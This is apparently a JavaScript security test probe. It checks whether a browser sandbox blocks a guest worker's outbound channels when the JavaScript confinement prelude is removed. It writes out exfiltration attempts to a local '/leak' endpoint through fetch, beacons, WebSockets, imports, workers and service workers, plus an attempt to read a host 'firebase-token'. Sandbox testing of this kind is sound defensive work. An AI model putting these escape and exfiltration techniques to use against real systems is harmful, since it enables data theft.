// A hostile probe that runs WITHOUT the confinement prelude.
//
// `attack-egress.mjs` proves the deployed runtime denies authority, but it runs
// with both layers active: the JavaScript prelude that deletes globals AND the
// browser boundary (opaque origin plus the sandbox document CSP). A passing
// result there cannot say which layer did the work.
//
// This probe is loaded as a blob Worker owned by the sandbox document with no
// prelude prepended, so every global the prelude would have removed is present
// and reachable. Whatever still fails is denied by the browser itself.
//
// Each entry reports `blocked` only when the authority could not be exercised.
// A global that is merely absent counts as blocked and records `missing` so the
// two causes stay distinguishable in the recorded evidence.

const ORIGIN = 'http://127.0.0.1:4173';

async function attempt(label, callback) {
  try {
    await callback();
    return `${label}:available`;
  } catch (error) {
    const reason = error && error.name ? error.name : 'Error';
    return `${label}:blocked:${reason}`;
  }
}

function requireGlobal(name, value) {
  if (typeof value === 'undefined') throw new ReferenceError(`${name} missing`);
  return value;
}

async function probe() {
  const results = [];

  results.push(await attempt('fetch', async () => {
    requireGlobal('fetch', globalThis.fetch);
    await fetch(`${ORIGIN}/leak?via=no-prelude-fetch`);
  }));

  results.push(await attempt('xhr', () => {
    const XHR = requireGlobal('XMLHttpRequest', globalThis.XMLHttpRequest);
    const request = new XHR();
    request.open('GET', `${ORIGIN}/leak?via=no-prelude-xhr`, false);
    request.send();
  }));

  // Construction alone proves nothing: EventSource never throws synchronously
  // for a policy-refused URL, it reports asynchronously. Wait for the stream to
  // actually open before calling this authority reachable.
  results.push(await attempt('eventSource', () => new Promise((resolve, reject) => {
    const Source = requireGlobal('EventSource', globalThis.EventSource);
    const source = new Source(`${ORIGIN}/leak?via=no-prelude-event-source`);
    source.onopen = () => { source.close(); resolve(); };
    source.onerror = () => { source.close(); reject(new Error('refused')); };
  })));

  results.push(await attempt('sendBeacon', () => {
    const beacon = requireGlobal('sendBeacon', globalThis.navigator && navigator.sendBeacon);
    if (!beacon.call(navigator, `${ORIGIN}/leak?via=no-prelude-beacon`, 'secret')) {
      throw new Error('refused');
    }
  }));

  results.push(await attempt('importScripts', () => {
    const load = requireGlobal('importScripts', globalThis.importScripts);
    load(`${ORIGIN}/leak-module.mjs?via=no-prelude-import-scripts`);
  }));

  results.push(await attempt('dynamicImport', async () => {
    await import(`${ORIGIN}/leak-module.mjs?via=no-prelude-dynamic-import`);
  }));

  results.push(await attempt('websocket', () => new Promise((resolve, reject) => {
    const Socket = requireGlobal('WebSocket', globalThis.WebSocket);
    const socket = new Socket(`ws://127.0.0.1:4173/leak?via=no-prelude-websocket`);
    socket.onopen = () => { socket.close(); resolve(); };
    socket.onerror = () => reject(new Error('refused'));
  })));

  results.push(await attempt('indexedDB', () => new Promise((resolve, reject) => {
    const database = requireGlobal('indexedDB', globalThis.indexedDB);
    const request = database.open('cross-home-probe');
    request.onsuccess = () => { request.result.close(); resolve(); };
    request.onerror = () => reject(new Error('refused'));
    request.onblocked = () => reject(new Error('refused'));
  })));

  results.push(await attempt('cacheStorage', async () => {
    await requireGlobal('caches', globalThis.caches).open('cross-home-probe');
  }));

  // Likewise, constructing a channel in an opaque origin is not an escape by
  // itself. What matters is whether a context on the trusted host origin can be
  // reached. The host page listens on this name and echoes anything it hears,
  // so a reply here means the channel genuinely crossed the boundary.
  results.push(await attempt('broadcastChannelReach', () => new Promise((resolve, reject) => {
    const Channel = requireGlobal('BroadcastChannel', globalThis.BroadcastChannel);
    const channel = new Channel('cross-home-probe');
    channel.onmessage = () => { channel.close(); resolve(); };
    channel.postMessage('secret-from-guest');
    setTimeout(() => { channel.close(); reject(new Error('no-peer')); }, 1500);
  })));

  results.push(await attempt('subworker', () => new Promise((resolve, reject) => {
    const Nested = requireGlobal('Worker', globalThis.Worker);
    const source = `fetch(${JSON.stringify(`${ORIGIN}/leak?via=no-prelude-subworker`)})`
      + `.then(() => postMessage('available'), () => postMessage('blocked'))`;
    const url = URL.createObjectURL(new Blob([source], { type: 'text/javascript' }));
    const nested = new Nested(url);
    const settle = (ok) => {
      nested.terminate();
      URL.revokeObjectURL(url);
      if (ok) resolve(); else reject(new Error('refused'));
    };
    nested.onmessage = (event) => settle(event.data === 'available');
    nested.onerror = () => settle(false);
  })));

  // The host page keeps a Firebase-shaped secret in its own storage. A guest in
  // an opaque origin must not be able to name that origin's storage at all.
  results.push(await attempt('hostStorage', () => {
    requireGlobal('localStorage', globalThis.localStorage).getItem('firebase-token');
  }));

  results.push(await attempt('serviceWorker', async () => {
    const container = requireGlobal('serviceWorker', globalThis.navigator && navigator.serviceWorker);
    await container.register(`${ORIGIN}/leak-module.mjs?via=no-prelude-service-worker`);
  }));

  self.postMessage(results.join('|'));
}

void probe();
